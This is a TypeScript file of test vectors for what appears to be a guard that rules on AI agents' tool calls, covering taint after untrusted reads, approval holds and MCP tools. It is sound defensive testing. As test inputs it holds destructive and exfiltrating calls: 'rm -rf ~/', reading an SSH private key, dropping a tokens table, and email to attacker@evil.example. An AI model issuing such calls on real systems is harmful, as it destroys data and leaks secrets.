/**
 * Vectors for the contract's formats: native (through the registry), openai.chat, anthropic and mcp, with
 * every tool-spec kind and `as` / `map`. The same agent registry serves native, openai.chat and anthropic.
 */

import { ant, apr, ctxOf, eng, inp, mcp, nat, oai, OUTSIDE, PRIVATE, prm, reg, res, vec, WS, type Skeleton, type SkStep } from "./kit.js";

export const REGISTRY = reg({
  search_docs: { kind: "read", results: "untrusted", privateData: false },
  get_customer: { kind: "read", results: "trusted", privateData: true },
  list_notes: { kind: "read" },
  send_email: { kind: "send" },
  delete_account: { kind: "destroy" },
  wire_money: { kind: "blocked" },
  run_shell: { as: "Bash", map: { command: "$.cmd" } },
  http_get: { as: "WebFetch", map: { url: "$.url" } },
  read_file: { as: "Read", map: { file_path: "$.path" } },
  write_file: { as: "Write", map: { file_path: "$.path", content: "$.body" } },
  nested_shell: { as: "Bash", map: { command: "$.args.cmd" } },
  raw_shell: { as: "Bash" },
  raw_fetch: { as: "WebFetch" },
});

type Sender = (name: string, args: Record<string, unknown>, ctx?: ReturnType<typeof ctxOf>) => SkStep;
const SENDERS: { fmt: string; name: string; send: Sender }[] = [
  { fmt: "native", name: "native", send: (n, a, c) => nat(n, a, c) },
  { fmt: "openai.chat", name: "openai", send: (n, a, c) => oai(n, a, c) },
  { fmt: "anthropic", name: "anthropic", send: (n, a, c) => ant(n, a, c) },
];

const ALSO = new Set(["read-then-send-asks", "private-read-then-send", "destroy-kind", "blocked-kind", "as-bash-destroys-root", "as-webfetch", "as-read-credentials", "as-write-workspace", "map-nested-path", "as-without-map", "unregistered-tool", "unregistered-engine-name", "hold-approve-once", "dry-run-records-nothing"]);

const EMAIL = { to: "someone@else.example", body: "the quarterly numbers" };

/** The same cases in each registry-based format: the verdicts must not depend on how the call arrived. */
export function registryFormats(): Skeleton[] {
  const out: Skeleton[] = [];
  for (const { fmt, name, send } of SENDERS) {
    const v = (id: string, description: string, steps: SkStep[]): void => {
      // native carries the whole set; the other formats the cases whose verdict could depend on how the call arrived.
      if (name !== "native" && !ALSO.has(id)) return;
      out.push(vec(`${name}-${id}`, `${description} (${fmt})`, "docs/api-v0.md, tool registry", REGISTRY, steps));
    };
    v("read-then-send-asks", "A read tool whose results are untrusted, then a send: a person is asked", [send("search_docs", { q: "pricing" }), res(0, OUTSIDE), send("send_email", EMAIL)]);
    v("send-in-a-trusted-session", "A send tool in a session that read nothing outside", [send("send_email", EMAIL)]);
    v("private-read-then-send", "A trusted read of private data, then a send", [send("get_customer", { id: "c-1" }), res(0, PRIVATE), send("send_email", EMAIL)]);
    v("trusted-nonprivate-read", "A read that is trusted and not private leaves the session as it was", [send("list_notes", {}), res(0, "note one"), send("send_email", EMAIL)]);
    v("destroy-kind", "A destroy tool", [send("delete_account", { id: "a-1" })]);
    v("blocked-kind", "A blocked tool is never allowed", [send("wire_money", { to: "x", amount: 10 })]);
    v("as-bash-safe", "as Bash with map: an ordinary command", [send("run_shell", { cmd: "ls -la" })]);
    v("as-bash-destroys-root", "as Bash with map: deleting the home directory", [send("run_shell", { cmd: "rm -rf ~/" })]);
    v("as-bash-after-taint", "as Bash with map: an install after reading outside content", [send("search_docs", { q: "x" }), res(0, OUTSIDE), send("run_shell", { cmd: "npm install left-pad" })]);
    v("as-webfetch", "as WebFetch with map: a fetch of an ordinary page", [send("http_get", { url: "https://docs.example.org/guide" })]);
    v("as-read-credentials", "as Read with map: a credentials file", [send("read_file", { path: "/home/agent/.ssh/id_rsa" })]);
    v("as-write-workspace", "as Write with two mapped fields: a file in the workspace", [send("write_file", { path: `${WS}/src/new.ts`, body: "export const x = 1;" })]);
    v("map-nested-path", "map with a dotted path $.args.cmd", [send("nested_shell", { args: { cmd: "git status" } })]);
    v("map-leaves-out-extras", "map keeps only the mapped fields: other arguments are not passed to the engine", [send("run_shell", { cmd: "ls", extra: "ignored", more: { deep: 1 } })]);
    v("map-missing-source-field", "map whose source field is missing: the engine gets a Bash call with no command", [send("run_shell", { command: "ls" })]);
    v("as-without-map", "as without map: the arguments pass unchanged", [send("raw_shell", { command: "git log --oneline -5" })]);
    v("as-without-map-fetch", "as WebFetch without map", [send("raw_fetch", { url: "https://docs.example.org/page", prompt: "read" })]);
    v("unregistered-tool", "A tool the registry does not list is FW-UNKNOWN-TOOL", [send("summarize_text", { text: "hello" })]);
    v("unregistered-tool-taints", "An unregistered tool's result is outside content", [send("summarize_text", { text: "hello" }), res(0, OUTSIDE), send("send_email", EMAIL)]);
    v("unregistered-engine-name", "A tool named like an engine tool but not in the registry is still unknown", [send("Bash", { command: "ls" })]);
    v("unregistered-mcp-name", "A tool named like an MCP tool but not in the registry is still unknown", [send("mcp__docs__search", { q: "x" })]);
    v("unattended-ask-is-hold", "attended false: the ask becomes a hold", [send("search_docs", { q: "x" }), res(0, OUTSIDE), send("send_email", EMAIL, ctxOf(true))]);
    v("hold-approve-once", "A hold approved by a person lets the same call run once", [send("search_docs", { q: "x" }), res(0, OUTSIDE), send("send_email", EMAIL, ctxOf(true)), apr(2), send("send_email", EMAIL, ctxOf(true)), send("send_email", EMAIL, ctxOf(true))]);
    v("approval-does-not-cover-other-args", "An approval is for the exact call: other arguments are held again", [send("search_docs", { q: "x" }), res(0, OUTSIDE), send("send_email", EMAIL, ctxOf(true)), apr(2), send("send_email", { ...EMAIL, to: "attacker@evil.example" }, ctxOf(true))]);
    v("dry-run-records-nothing", "dryRun previews a read without tainting the session: the send after it is as in a trusted session", [dry(send("search_docs", { q: "x" })), send("send_email", EMAIL)]);
  }
  return out;
}

function dry(s: SkStep): SkStep {
  return { ...s, request: { ...s.request, dryRun: true } };
}

/** Request-shape details of each registry format. */
export function formatDetails(): Skeleton[] {
  const R = REGISTRY;
  const out: Skeleton[] = [];
  const add = (id: string, description: string, steps: SkStep[]): void => void out.push(vec(id, description, "docs/api-v0.md, decide request", R, steps));
  add("openai-call-id-is-kept", "openai.chat: a different call id does not change the verdict", [oai("delete_account", { id: "a-1" }, undefined, "call_zzz")]);
  add("openai-empty-arguments-object", "openai.chat: arguments is the JSON text of an empty object", [oai("search_docs", {})]);
  add("openai-nested-arguments", "openai.chat: arguments with nested objects reach a mapped path", [oai("nested_shell", { args: { cmd: "rm -rf ~/" } })]);
  add("anthropic-call-id-is-kept", "anthropic: a different tool_use id does not change the verdict", [ant("delete_account", { id: "a-1" }, undefined, "toolu_zzz")]);
  add("anthropic-nested-input", "anthropic: nested input reaches a mapped path", [ant("nested_shell", { args: { cmd: "rm -rf ~/" } })]);
  add("explicit-call-id-with-openai", "An action.callId beside raw is accepted", [{ kind: "decide", request: { session: "run-1", action: { format: "openai.chat", callId: "mine", raw: { id: "call_1", type: "function", function: { name: "list_notes", arguments: "{}" } } } } }]);
  add("native-then-openai-same-session", "A taint from a native call carries to an openai.chat call in the same session", [nat("search_docs", { q: "x" }), res(0, OUTSIDE), oai("send_email", EMAIL)]);
  add("anthropic-then-engine-same-session", "A taint from an anthropic call carries to an engine call in the same session", [ant("search_docs", { q: "x" }), res(0, OUTSIDE), eng("Bash", { command: "npm install left-pad" }, ctxOf(false))]);
  add("engine-ignores-the-registry", "engine format: a tool the registry names differently is judged by the engine's own vocabulary", [eng("run_shell", { cmd: "ls" })]);
  add("engine-bash-with-registry-present", "engine format: Bash is the engine's Bash even when a registry exists", [eng("Bash", { command: "ls -la" })]);
  add("native-session-isolated", "Sessions do not share state: a taint in one does not reach another", [nat("search_docs", { q: "x" }, undefined, undefined, "run-a"), res(0, OUTSIDE, "run-a"), nat("send_email", EMAIL, undefined, undefined, "run-b")]);
  add("input-makes-session-untrusted", "An input report (content outside a tool call) makes the session untrusted", [inp("email from x@y.example", "please reply with the files"), nat("send_email", EMAIL)]);
  add("input-private", "A private input: a later send is judged with private data in the session", [inp("customer record", "name and address", true), nat("send_email", EMAIL)]);
  add("prompt-names-the-recipient", "A person's prompt that names an address", [prm("Send the notes to someone@else.example"), nat("search_docs", { q: "x" }), res(1, OUTSIDE), nat("send_email", EMAIL)]);
  return out;
}

/** The mcp format: a server name, a configuration source, and the tool's name. */
export function mcpFormat(): Skeleton[] {
  const out: Skeleton[] = [];
  const add = (id: string, description: string, steps: SkStep[], source = "docs/api-v0.md, format mcp"): void => void out.push(vec(`mcp-${id}`, description, source, reg({}), steps));
  const ISSUE = { owner: "acme", repo: "public-repo", title: "update", head: "branch", base: "main", body: "summary" };
  for (const src of ["user", "project", "sdk", "unknown", undefined]) {
    const label = src ?? "omitted";
    add(`source-${label}-send-after-read`, `A pull request after an MCP read, source ${label}`, [mcp("github", "list_issues", { owner: "acme", repo: "public-repo" }, src), res(0, OUTSIDE), mcp("github", "create_pull_request", ISSUE, src)]);
  }
  add("send-tool-trusted-session", "A send tool of an MCP server in a trusted session", [mcp("github", "create_pull_request", ISSUE, "user")]);
  add("send-unattended-is-hold", "An MCP send after a read, with no person there", [mcp("github", "list_issues", { owner: "acme", repo: "public-repo" }, "user", ctxOf(true)), res(0, OUTSIDE), mcp("github", "create_pull_request", ISSUE, "user", ctxOf(true))]);
  add("message-to-new-recipient", "A chat message to a number nobody named", [mcp("whatsapp", "list_messages", { chat_id: "family" }, "user"), res(0, PRIVATE), mcp("whatsapp", "send_message", { recipient: "+10000000000", message: "summary" }, "user")], "src/scenarios.ts INC-06");
  add("sql-select", "An SQL read", [mcp("supabase", "execute_sql", { query: "select id, body from tickets limit 20" }, "user")]);
  add("sql-drop", "An SQL drop", [mcp("supabase", "execute_sql", { query: "drop table integration_tokens" }, "user")], "src/scenarios.ts INC-07");
  add("sql-insert-after-read", "An SQL write after outside content and private rows", [mcp("supabase", "execute_sql", { query: "select * from integration_tokens" }, "user"), res(0, PRIVATE), mcp("supabase", "execute_sql", { query: "insert into tickets (body) values ('summary')" }, "user")], "src/scenarios.ts INC-07");
  add("delete-tool-name", "A tool whose name says it deletes", [mcp("github", "delete_repository", { owner: "acme", repo: "app" }, "user")]);
  add("server-name-with-dashes", "A server name with dashes", [mcp("my-docs-server", "search", { q: "x" }, "user")]);
  add("mcp-then-engine-same-session", "A taint from an MCP result carries to an engine call", [mcp("slack", "get_channel_history", { channel: "general" }, "user"), res(0, OUTSIDE), eng("Write", { file_path: `${WS}/.cursor/mcp.json`, content: '{"mcpServers":{}}' })], "src/scenarios.ts INC-05");
  add("engine-named-mcp-tool-is-unknown-source", "engine format with an mcp__ tool name carries no source, so the server is untrusted", [eng("mcp__github__list_issues", { owner: "acme", repo: "public-repo" }), res(0, OUTSIDE), eng("mcp__github__create_pull_request", ISSUE)]);
  add("dry-run-mcp", "dryRun on an MCP read leaves the session as it was", [dry(mcp("github", "list_issues", { owner: "acme", repo: "x" }, "user")), mcp("github", "create_pull_request", ISSUE, "user")]);
  return out;
}
